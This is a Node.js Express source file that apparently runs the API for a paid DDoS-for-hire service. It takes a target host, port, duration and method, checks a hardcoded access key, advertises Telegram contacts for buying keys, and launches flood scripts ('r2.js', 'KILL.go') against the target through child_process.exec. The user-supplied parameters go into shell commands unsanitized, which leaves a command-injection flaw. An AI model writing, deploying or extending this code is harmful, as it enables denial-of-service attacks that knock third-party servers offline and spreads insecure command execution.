const express = require("express");
const app = express();
const port = 9998;
var exec = require("child_process").exec;

app.get("/api/attack", (req, res) => {
  const clientIP =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;
  console.log(`IP Connect: ${clientIP}`);
  if (!key || !host || !time || !method || !port) {
    const err_u = {
      status: `error`,
      message: `Server url API : /api/attack?key=EnterYouKey&host={host}&port={port}&method={method}&time={time}`,
      info: `t.me/haibe206`,
    };
    return res.status(400).send(err_u);
  }

  if (key !== "haibedz") {
    const err_key = {
      status: `error`,
      message: `Error Keys | Dms Buy Key : t.me/haibe206`,
      info: `t.me/haibe206`,
    };
    return res.status(400).send(err_key);
  }

  if (time > 300) {
    const err_time = {
      status: `error`,
      message: `Error Time < 60 Second`,
      info: `t.me/haibe206`,
    };
    return res.status(400).send(err_time);
  }
  if (port > 65535 || port < 1) {
    const err_time = {
      status: `error`,
      message: `Error Port`,
      info: `t.me/haibe206`,
    };
    return res.status(400).send(err_time);
  }

  if (
    !(
      method.toLowerCase() === "kill" ||
      method.toLowerCase() === "raw"
    )
  ) {
    const err_method = {
      status: `error`,
      method_valid: `Error Methods`,
      info: `t.me/cyberviet`,
    };
    return res.status(400).send(err_method);
  }

  const jsonData = {
    status: `success`,
    message: `Send Attack Successful`,
    host: `${host}`,
    port: `${port}`,
    time: `${time}`,
    method: `${method}`,
    info: `t.me/cyberviet`,
  };
  res.status(200).send(jsonData);
  if (method.toLowerCase() === "raw") {
    exec(
      `node r2.js ${host} ${port} 99 ${time}`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [TLS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "kill") {
    exec(
      `go run KILL.go ${host} ${port} ${time} payload=random size=1000`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [TLS] executed successfully`);
      },
    );
  }
});
app.listen(port, () => {
  console.log(`[API SERVER] running on http://localhost:${port}`);
});
